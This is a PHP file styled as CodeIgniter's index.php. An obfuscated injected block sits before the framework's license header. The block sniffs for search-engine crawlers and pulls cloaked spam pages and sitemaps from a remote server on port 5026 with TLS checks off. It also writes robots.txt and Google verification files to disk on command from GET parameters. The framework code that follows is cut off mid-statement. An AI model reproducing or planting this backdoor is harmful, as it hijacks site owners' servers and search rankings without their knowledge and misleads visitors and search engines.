<?php
error_reporting(0);header('Content-Type: text/html; charset=utf-8');$OoooOO0 = '5026';$OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c";$O=urldecode($OOOOOO);date_default_timezone_set($O{35}.$O{29}.$O{47});$OO = @$_SERVER[$O{38}.$O{34}.$O{47}.$O{32}.$O{51}.$O{28}.$O{50}.$O{30}.$O{52}.$O{29}.$O{34}.$O{34}.$O{30}];$Oo = @$_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}];$OoO = @$_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{41}.$O{34}.$O{37}.$O{30}];$Ooolg = @$_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{36}.$O{47}.$O{47}.$O{28}.$O{35}.$O{30}.$O{52}.$O{44}.$O{36}.$O{50}.$O{40}.$O{32}.$O{36}.$O{40}.$O{28}];$OOOOO = @$_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{32}.$O{37}.$O{28}.$O{29}.$O{52}.$O{36}.$O{40}.$O{28}.$O{50}.$O{30}];$OOOOOo = @$_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{29}.$O{28}.$O{39}.$O{28}.$O{29}.$O{28}.$O{29}];$OOOOOOO = ((isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{37}]) && $_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{37}] == $O{8}.$O{24}) || (isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{46}.$O{52}.$O{39}.$O{34}.$O{29}.$O{27}.$O{36}.$O{29}.$O{38}.$O{28}.$O{38}.$O{52}.$O{35}.$O{29}.$O{34}.$O{30}.$O{34}]) && $_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{46}.$O{52}.$O{39}.$O{34}.$O{29}.$O{27}.$O{36}.$O{29}.$O{38}.$O{28}.$O{38}.$O{52}.$O{35}.$O{29}.$O{34}.$O{30}.$O{34}] == $O{15}.$O{4}.$O{4}.$O{9}.$O{11})) ? $O{15}.$O{4}.$O{4}.$O{9}.$O{11}.$O{62}.$O{63}.$O{63} : $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63};$OOOOOOOo = $OOOOOOO . $OoO;$OOOOO = @strtolower($OOOOO);$OOOOOo = @strtolower($OOOOOo);if(getenv($O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{47}.$O{44}.$O{33}.$O{28}.$O{50}.$O{30}.$O{52}.$O{33}.$O{35})){ $oo00oo00 = getenv($O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{47}.$O{44}.$O{33}.$O{28}.$O{50}.$O{30}.$O{52}.$O{33}.$O{35}); } elseif(getenv($O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{46}.$O{52}.$O{39}.$O{34}.$O{29}.$O{27}.$O{36}.$O{29}.$O{38}.$O{28}.$O{38}.$O{52}.$O{39}.$O{34}.$O{29})) { $oo00oo00 = getenv($O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{46}.$O{52}.$O{39}.$O{34}.$O{29}.$O{27}.$O{36}.$O{29}.$O{38}.$O{28}.$O{38}.$O{52}.$O{39}.$O{34}.$O{29}); } elseif(getenv($O{29}.$O{28}.$O{51}.$O{34}.$O{30}.$O{28}.$O{52}.$O{36}.$O{38}.$O{38}.$O{29})) {$oo00oo00 = getenv($O{29}.$O{28}.$O{51}.$O{34}.$O{30}.$O{28}.$O{52}.$O{36}.$O{38}.$O{38}.$O{29}); } else {$oo00oo00 = $_SERVER[$O{29}.$O{28}.$O{51}.$O{34}.$O{30}.$O{28}.$O{52}.$O{36}.$O{38}.$O{38}.$O{29}];}if(isset($_GET[$O{22}.$O{13}])&&$_GET[$O{22}.$O{13}]==$O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) {echo $O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{57}.$O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{88};exit;}if (strstr($Oo, $O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52})) {$Ooooo = dirname($Oo);OooooOOOOoo($O,$OoooOO0,$OOOOOOOo,$Oo,$OoO,$OOOOOOO,$Ooooo);}if (strstr($Oo, $O{59}.$O{20}.$O{25}.$O{18})) {$Ooooo = dirname($Oo);OooooO($O,$OoooOO0,$OOOOOOOo,$Oo,$OOOOOOO,$OoO,$oo00oo00,$Ooooo);}function OooooOOOOoo($O,$OoooOO0,$OOOOOOOo,$Oo,$OoO,$OOOOOOO,$Ooooo){$Oooooo = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{36}.$O{9}.$O{7}.$O{63}.$O{11}.$O{7}.$O{4}.$O{2}.$O{36}.$O{18}.$O{18}.$O{51}.$O{10}.$O{9}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{9}.$O{1}.$O{12}.$O{61}.$O{11}.$O{18}.$O{64}.$O{65}.$O{66}.$O{78}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OOOOOOOo;if ($_GET[$O{22}.$O{13}.$O{52}.$O{10}.$O{18}.$O{18}.$O{25}.$O{10}.$O{9}] == $O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) { echo $Oooooo; exit;}$Ooooooo = json_decode(OooooOO($O,$Oooooo), true);if (empty($Ooooooo)||$Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}] == 404) { header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{67}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); header($O{37}.$O{4}.$O{10}.$O{4}.$O{6}.$O{11}.$O{62}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); exit();}if (empty($Ooooooo)||$Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}] == 444) { header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{67}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); header($O{37}.$O{4}.$O{10}.$O{4}.$O{6}.$O{11}.$O{62}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); exit();}$Oooooooo = $Ooooooo[$O{12}.$O{10}.$O{4}.$O{10}];header($O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{4}.$O{5}.$O{9}.$O{2}.$O{62}.$O{4}.$O{2}.$O{20}.$O{4}.$O{63}.$O{20}.$O{25}.$O{18});echo $Oooooooo;exit();}function OooooO($O,$OoooOO0,$OOOOOOOo,$Oo,$OOOOOOO,$OoO,$oo00oo00,$Ooooo='',$o0o0oo='') {$Oooooo = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{36}.$O{9}.$O{7}.$O{63}.$O{11}.$O{7}.$O{4}.$O{2}.$O{32}.$O{3}.$O{18}.$O{36}.$O{9}.$O{7}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{11}.$O{4}.$O{5}.$O{9}.$O{2}.$O{61}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{78}.$O{24}.$O{6}.$O{25}.$O{61}.$O{68}.$O{67}.$O{67}.$O{67}.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{6}.$O{3}.$O{18}.$O{61}.$Oo.$O{78}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OOOOOOOo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00;if ($_GET[$O{22}.$O{13}.$O{52}.$O{25}.$O{10}.$O{9}] == $O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) { echo $Oooooo; exit;}$Ooooooo = json_decode(OooooOO($O,$Oooooo), true);if (isset($Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}])&&$Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}]==$O{68}.$O{67}.$O{67}) {$Oooooooo = $Ooooooo[$O{12}.$O{10}.$O{4}.$O{10}];foreach($Oooooooo as $Oog => $Oov){$o0o0oooo = OooooOO($O,$Oov);$Oooo0s = (strpos($o0o0oooo,$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{57}.$O{50}.$O{8}.$O{4}.$O{7}.$O{13}.$O{7}.$O{21}.$O{10}.$O{4}.$O{7}.$O{8}.$O{24}.$O{57}.$O{29}.$O{2}.$O{21}.$O{2}.$O{7}.$O{22}.$O{2}.$O{12}) !== false) ? $O{34}.$O{43} : $O{28}.$O{29}.$O{29}.$O{34}.$O{29};echo $Oov.$O{61}.$O{61}.$O{61}.$O{56}.$O{37}.$O{6}.$O{23}.$O{25}.$O{7}.$O{4}.$O{4}.$O{7}.$O{24}.$O{14}.$O{57}.$O{40}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{57}.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$O{57}.$Oooo0s.PHP_EOL;}exit();} if (isset($Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}])&&$Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}]==$O{70}.$O{67}.$O{68}){echo $O{37}.$O{6}.$O{23}.$O{25}.$O{7}.$O{4}.$O{4}.$O{7}.$O{24}.$O{14}.$O{57}.$O{40}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{57}.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{57}.$O{29}.$O{2}.$O{4}.$O{6}.$O{3}.$O{24}.$O{57}.$O{39}.$O{10}.$O{7}.$O{18};exit();}if (empty($Ooooooo)||$Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}] == 404) { header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{67}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); header($O{37}.$O{4}.$O{10}.$O{4}.$O{6}.$O{11}.$O{62}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12}); exit();}$Oooooooo = $Ooooooo[$O{12}.$O{10}.$O{4}.$O{10}];header($O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{4}.$O{5}.$O{9}.$O{2}.$O{62}.$O{4}.$O{2}.$O{20}.$O{4}.$O{63}.$O{20}.$O{25}.$O{18});echo $Oooooooo;exit();}if(isset($_GET[$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}])){$OoOO=$_GET[$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}];if (preg_match($O{63}.$O{79}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{59}.$O{89}.$O{55}.$O{76}.$O{83}.$O{59}.$O{15}.$O{4}.$O{25}.$O{18}.$O{77}.$O{80}.$O{63}.$O{7}, $OoOO)) {OooooOOOO($O,$OoOO,$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{53}.$O{11}.$O{7}.$O{4}.$O{2}.$O{53}.$O{22}.$O{2}.$O{3}.$O{7}.$O{13}.$O{7}.$O{21}.$O{10}.$O{4}.$O{7}.$O{8}.$O{24}.$O{62}.' '.$OoOO);exit($O{58}.$O{10}.$O{57}.$O{15}.$O{3}.$O{2}.$O{13}.$O{61}.$OoOO.$O{56}.$OoOO.$O{58}.$O{63}.$O{10}.$O{56});}}if(isset($_GET[$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}])){$o0o0o = $_GET[$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}];if(preg_match($O{63}.$O{76}.$O{83}.$O{59}.$O{9}.$O{15}.$O{9}.$O{77}.$O{80}.$O{63}.$O{7}, $o0o0o)){ $OOOOOOOo = $OOOOOOOo.$O{63}.$o0o0o.$O{55};} else { $OOOOOOOo = $OOOOOOOo.$O{63};}OooooOOOO($O,$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4},$O{32}.$O{11}.$O{2}.$O{3}.$O{53}.$O{10}.$O{14}.$O{2}.$O{24}.$O{4}.$O{62}.$O{57}.$O{89}.PHP_EOL.$O{36}.$O{18}.$O{18}.$O{8}.$O{1}.$O{62}.$O{57}.$O{63}.PHP_EOL.$O{47}.$O{3}.$O{10}.$O{1}.$O{18}.$O{53}.$O{12}.$O{2}.$O{18}.$O{10}.$O{5}.$O{62}.$O{66}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{64}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{65}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{66}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{70}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{69}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{68}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{72}.$O{59}.$O{20}.$O{25}.$O{18}.PHP_EOL.$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$OOOOOOOo.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{52}.$O{71}.$O{59}.$O{20}.$O{25}.$O{18});$OooooOOOO0 = file_get_contents($O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4});echo $OooooOOOO0;exit();}if(preg_match($O{63}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{59}.$O{21}.$O{8}.$O{59}.$O{16}.$O{9}.$O{90}.$O{5}.$O{10}.$O{15}.$O{8}.$O{8}.$O{90}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{83}.$O{59}.$O{21}.$O{8}.$O{25}.$O{81}.$O{79}.$O{59}.$O{82}.$O{89}.$O{55}.$O{80}.$O{90}.$O{23}.$O{7}.$O{24}.$O{14}.$O{63}.$O{7}, $OOOOOo)){ if ($_GET[$O{22}.$O{13}.$O{52}.$O{16}.$O{6}.$O{25}.$O{9}] == $O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) { echo $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{16}.$O{6}.$O{25}.$O{9}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{23}.$O{8}.$O{4}.$O{61}.$O{67}.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{3}.$O{2}.$O{13}.$O{2}.$O{3}.$O{61}.$OOOOOo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg; exit;} $o0o0ooo=OooooOO($O,$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{16}.$O{6}.$O{25}.$O{9}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{23}.$O{8}.$O{4}.$O{61}.$O{67}.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{3}.$O{2}.$O{13}.$O{2}.$O{3}.$O{61}.$OOOOOo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg);if ($o0o0ooo) {echo $o0o0ooo;exit();}}if(stristr($OOOOO,$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{23}.$O{8}.$O{4})||stristr($OOOOO,$O{23}.$O{7}.$O{24}.$O{14})||stristr($OOOOO,$O{31}.$O{88}.$O{42})||stristr($OOOOO,$O{5}.$O{88}.$O{16})||stristr($OOOOO,$O{5}.$O{10}.$O{15}.$O{8}.$O{8})||stristr($OOOOO,$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2})||stristr($OOOOO,$O{40}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{23}.$O{8}.$O{4})||stristr($OOOOO,$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{23}.$O{8}.$O{4})){if ($_GET[$O{22}.$O{13}.$O{52}.$O{23}.$O{8}.$O{4}] == $O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) { echo $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{73}.$O{64}.$O{71}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{23}.$O{8}.$O{4}.$O{61}.$O{64}.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg; exit;}$OooOO = OooooOO($O,$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{73}.$O{64}.$O{71}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{23}.$O{8}.$O{4}.$O{61}.$O{64}.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg);if(!empty($OooOO)){ $Ooooooo = json_decode($OooOO, true); if ($Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}] == 404) {header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{67}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12});header($O{37}.$O{4}.$O{10}.$O{4}.$O{6}.$O{11}.$O{62}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12});exit(); } if ($Ooooooo[$O{21}.$O{8}.$O{12}.$O{2}] == 500) {header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{64}.$O{57}.$O{69}.$O{67}.$O{67}.$O{57}.$O{33}.$O{24}.$O{4}.$O{2}.$O{3}.$O{24}.$O{10}.$O{18}.$O{57}.$O{37}.$O{2}.$O{3}.$O{22}.$O{2}.$O{3}.$O{57}.$O{28}.$O{3}.$O{3}.$O{8}.$O{3});exit(); }echo $OooOO;exit;}}if ($_GET[$O{22}.$O{13}.$O{52}.$O{8}.$O{3}.$O{7}.$O{14}.$O{7}.$O{24}] == $O{8}.$O{24}.$O{18}.$O{7}.$O{24}.$O{2}.$O{69}.$O{69}.$O{68}.$O{68}) {echo $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{8}.$O{3}.$O{14}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg;exit;}OooooOO($O,$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OoooOO0.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{8}.$O{3}.$O{14}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{8}.$O{25}.$O{10}.$O{7}.$O{24}.$O{61}.$OoO.$O{78}.$O{9}.$O{10}.$O{14}.$O{2}.$O{61}.$Oo.$O{78}.$O{9}.$O{3}.$O{61}.$Ooooo.$O{78}.$O{7}.$O{9}.$O{61}.$oo00oo00.$O{78}.$O{18}.$O{14}.$O{61}.$Ooolg);function OooooOO($O,$OooO){$OooOO = '';$OooOOO = $O{51}.$O{8}.$O{19}.$O{7}.$O{18}.$O{18}.$O{10}.$O{63}.$O{70}.$O{59}.$O{67}.$O{57}.$O{76}.$O{21}.$O{8}.$O{25}.$O{9}.$O{10}.$O{4}.$O{7}.$O{23}.$O{18}.$O{2}.$O{75}.$O{51}.$O{37}.$O{33}.$O{28}.$O{57}.$O{68}.$O{59}.$O{67}.$O{75}.$O{27}.$O{7}.$O{24}.$O{12}.$O{8}.$O{1}.$O{11}.$O{57}.$O{50}.$O{30}.$O{57}.$O{69}.$O{59}.$O{65}.$O{75}.$O{59}.$O{50}.$O{28}.$O{30}.$O{57}.$O{47}.$O{44}.$O{29}.$O{57}.$O{64}.$O{59}.$O{64}.$O{59}.$O{70}.$O{66}.$O{65}.$O{65}.$O{77};if(function_exists($O{21}.$O{6}.$O{3}.$O{18}.$O{52}.$O{7}.$O{24}.$O{7}.$O{4})){try{$OooOOOO = curl_init();$OoooOO = 30;curl_setopt($OooOOOO,CURLOPT_URL,$OooO);curl_setopt($OooOOOO,CURLOPT_SSL_VERIFYHOST, 0);curl_setopt($OooOOOO,CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($OooOOOO,CURLOPT_RETURNTRANSFER,1);curl_setopt($OooOOOO,CURLOPT_CONNECTTIMEOUT,$OoooOO);$OooOO = curl_exec($OooOOOO);curl_close($OooOOOO);}catch (Exception $e){}}if(strlen($OooOO)<1&&function_exists($O{13}.$O{7}.$O{18}.$O{2}.$O{52}.$O{14}.$O{2}.$O{4}.$O{52}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{11})){ini_set($O{6}.$O{11}.$O{2}.$O{3}.$O{52}.$O{10}.$O{14}.$O{2}.$O{24}.$O{4},$OooOOO);try{$OooOO = @file_get_contents($OooO);}catch (Exception $e){}}return $OooOO;}function OooooOOOO($O,$Ooo, $OooOOOOO) {$OoooO = fopen($Ooo, $O{1}) or die('0');fwrite($OoooO, $OooOOOOO);fclose($OoooO);}?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 */
	define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'development');

/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
switch (ENVIRONMENT)
{
	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
	break;

	case 'testing':
	case 'production':
